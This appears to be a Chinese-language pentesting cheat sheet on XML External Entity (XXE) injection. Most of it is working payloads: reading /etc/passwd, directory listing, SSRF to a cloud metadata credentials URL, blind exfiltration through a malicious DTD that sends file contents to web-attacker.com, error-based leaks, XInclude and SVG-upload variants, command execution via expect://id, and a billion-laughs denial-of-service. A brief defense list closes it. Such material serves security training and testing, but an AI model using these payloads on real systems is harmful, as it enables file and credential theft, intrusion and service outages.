# XXE

## 介绍

XXE 简单来说就是 XML 外部实体注入，主要利用 XML 解析功能漏洞，解析 XML 输入时，没有禁止对外部实体的加载，导致可以加载恶意的外部文件，攻击者通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口检测、攻击内网网站、DDOS 攻击等等

## 位置

* 可以上传 XML 文件的位置

## 影响

* 文件读取
* 命令执行
* 内网端口检测
* 攻击内网网站
* DDOS 攻击
* SSRF

## 原因

* 没有禁止对外部实体的加载
* XML 解析器!ENTITY 标签被近似处理，并且是我们利用的关键

## XXE 攻击

### 读文件

> * Linux 读取 /etc/hosts
> * Windows 读取 C:\windows\system32\drivers\etc\hosts

1.  第一个案例：

    ```xml
    <!--?xml version="1.0" ?-->
    <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
    <data>&example;</data>
    ```
2.  如果网站使用 PHP 环境搭建，我们可以使用下面方法读取

    ```xml
    <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
    <data>&example;</data>
    ```
3.  设置 `Element stockCheck` as ANY

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
    <!ELEMENT stockCheck ANY>
    <!ENTITY file SYSTEM "file:///etc/passwd">
    ]>
    <stockCheck>
        <productId>&file;</productId>
        <storeId>1</storeId>
    </stockCheck>
    ```

### 目录枚举

> 在基于 Java 的应用程序中，可能会通过 XXE 列出目录的内容

```xml
<!-- 根目录 / -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aa[
	<!ELEMENT bb ANY>
	<!ENTITY xxe SYSTEM "file:///">
]>
<root>
    <foo>&xxe;</foo>
</root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
	<!ENTITY xxe SYSTEM "file:///etc/" >
]>
<root>
    <foo>&xxe;</foo>
</root>
```

### SSRF

> 要想 XXE 漏洞执行 SSRF 攻击，我们需要知道指定的 URL
>
> * 响应中存在资源
> * 响应中不存在资源，我们只能执行 Bind SSRF 攻击

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> 
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

### Bind XXE

> Bind XXE 出现在应用程序易受到 XXE 注入攻击，但是在响应中不存在任何资源，这意味着我们无法直接检索服务器端文件，因此 Bind XXE 比常规 XXE 漏洞更加难以利用
>
> * 使用 OAST 技术检测，有时会在交互数据中泄露敏感数据
> * 通过错误消息包含敏感数据的方式触发 XML 解析错误

#### 1. 使用 OAST 技术检测 -- 内部实体

这种攻击将会向指定的 URL 发出后端请求

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
	<!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> 	%xxe; 
]>
<stockCheck>
    <productId>3</productId>
    <storeId>1</storeId>
</stockCheck>
```

#### 2. 使用 OAST 技术检测 -- 外部实体

我们使服务器加载一个带有恶意负载的 DTD ，该负载将通过 HTTP 请求发送文件的内容

```
<!-- malicious.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

> 该 DTD 执行步骤：
>
> * 定义一个名为 file 的 XML 参数实体，包含 /etc/passwd 文件内容
> * 定义一个名为 eval 的 XML 参数实体，其中包含另一个名为 exfiltrate 的 XML 的参数实体的动态声明，将通过向攻击者的 WEB 服务器发出 HTP 请求来评估 exfiletrate 实体，其中包含 URL 查询字符串的文件实体值
> * 使用 %eval ，这将会执行 exfiletrate 实体的动态声明
> * 使用 exfiletrate 实体，以便通过请求指定 URL 来获取其值

然后攻击者必须在他们控制的系统上托管恶意的 DTD文件，通常会加载到网络服务器上，eg : http://web-attacker.com/malicious.dtd

最后攻击者必须向易受攻击的应用程序提交以下 XXE 负载：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> 
	%xxe;
]>
<stockCheck>
    <productId>3</productId>
    <storeId>1</storeId>
</stockCheck>
```

这个 XXE Payload 声明了一个 xxe 的 XML 参数实体，然后在 DTD 中使用该实体，这将会导致 XML 解析器从攻击者主机获取外部 DTD 并内联解析，然后执行恶意 DTD 中定义的步骤，并将 /etc/passwd 文件传输给攻击者

#### 3. Bind XXE - 错误消息

> 在这种情况下，我们将使服务器加载一个恶意 DTD ，该 DTD 将在错误消息中显示文件的内容

我们可以使用恶意的外部 DTD 来触发包含 /etc/passwd 文件内容的 XML 解析错误消息：

```
<!-- malicious.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

该 DTD 实现的步骤：

* 定义一个名为 file 的 XML 参数实体，包含 /etc/passwd 文件内容
* 定义一个名为 eval 的 XML 参数实体，其中包含另一个名为 error 的 XML 的参数实体的动态声明，error 实体将通过加载一个不存在的五呢关键来评估，该文件的名称包含文件实体的值
* 使用 %eval ，这将会执行 error 实体的动态声明
* 使用 error 实体，以便通过尝试加载不存在的文件来评估其值，从而导致包含不存在文件名称的错误消息，该文件是 /etc/passwd 文件内容

#### 4. Bind XXE -- 错误消息 （系统 DTD）

> 当外部交互不被允许的情况下， Bling XXE 又该如何执行呢？
>
> 在这种情况下，由于 XML 语言规范中的漏洞，仍然有可能触发包含敏感数据的错误消息。如果文档的 DTD 使用内部和外部 DTD 声明的混合，那么内部 DTD 可以重新定义在外部 DTD 中声明的实体，发生这种情况时，对在另一个参数实体的定义中使用 XML 参数实体限制就会放宽。
>
> 这意味着攻击者可以从内部 DTD 中使用基于错误的 XXE 技术，前提是他们使用的 XML 参数实体正在重新定义外部 DTD 中声明的实体，当然，如果带外连接被阻塞则无法从远程位置加载外部 DTD，相反他需要的是应用程序服务器本地的外部 DTD 文件。本质上讲，攻击设计调用碰巧存在在本地文件系统上的 DTD 文件，并将重新用于以触发解析的方式重新定义现有实体包含铭感数据的错误。
>
> 比如，假设服务器文件系统上的 /usr/local/app/schema.dtd 位置有一个 DTD 文件，这个 DTD 文件定义了一个名为 custom\_entity 的实体，攻击者可能通过提交如下所示的混合 DTD 来触发包含 /etc/passwd 文件内容的 XML 解析错误消息

```
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

这个 DTD 执行遵循以下步骤：

* 定义一个名为 local\_dtd 的 XML 参数实体，包含服务器文件系统上存在的外部 DTD 文件内容
* 重新定义名为 custom\_entity 的参数实体，该实体已在外部 DTD 文件中定义。该实体被重写定义为包含已经描述的基于错误的 XXE 攻击，用于触发包含 /etc/passwd 文件内容的错误消息
* 使用 local\_dtd 实体，以便解释外部 DTD ，包括 custom\_entity 实体重新定义值，这会产生所需的错误消息

### XInclude 攻击

一些应用程序接收到客户端提交的数据后，在服务器端将其嵌入到 XML 文档中，然后解析该文档，当客户端提交的数据被放入后端 SOAP 请求，并有后端 SOAP 服务处理时，就会出现这种漏洞。

> 在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改`DOCTYPE`元素。但是，您也许可以`XInclude`改用。`XInclude`是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以`XInclude`在 XML 文档中的任何数据值中进行攻击，因此可以在您仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。

要执行`XInclude`攻击，您需要引用`XInclude`命名空间并提供您希望包含的文件的路径。例如：

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### 利用文件上传进行 XXE 攻击

一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例是办公文档格式（如 DOCX）和图像格式（如 SVG）。

例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收 PNG 或 JPEG 等格式，正在使用的图像处理库也可能支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面。

```xml
<!-- SVG 图像 -->
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### 通过修改内容类型进行 XXE 攻击

大多数 POST 请求使用由 HTML 表单生成的默认内容类型，例如`application/x-www-form-urlencoded`. 一些网站希望接收这种格式的请求，但会容忍其他内容类型，包括 XML

例如，如果一个普通请求包含以下内容：

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

然后您可以提交以下请求，并得到相同的结果：

```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用程序容忍消息正文中包含 XML 的请求，并将正文内容解析为 XML，那么只需将请求重新格式化为使用 XML 格式，您就可以到达隐藏的 XXE 攻击面。

### 远程代码执行

这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：

```
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <description>&xxe;</description>
   </core>
</catalog>
```

### DDOS 攻击

```
<?xml version="1.0"?>

<!DOCTYPE lolz [

  <!ENTITY lol "abc">

  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">

  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">

  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">

  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">

  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">

  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">

  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">

  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">

]>

<lolz>&lol9;</lolz>
```

该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”abc”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。

## 防御

* 禁用外部实体
* 过滤和验证用户提交的 XML 数据
* 不允许 XML 中含有任何自己声明的 DTD
* 禁用 XInclude

## 参考文章

* [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#what-are-xml-entities)
* [XXE](https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/04.XXE/#xml%E5%9F%BA%E7%A1%80)
* [XML 外部实体注入](https://wizardforcel.gitbooks.io/web-hacking-101/content/14.html)
* [XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)
* [XXE 从入门到放弃](https://www.anquanke.com/post/id/197423)
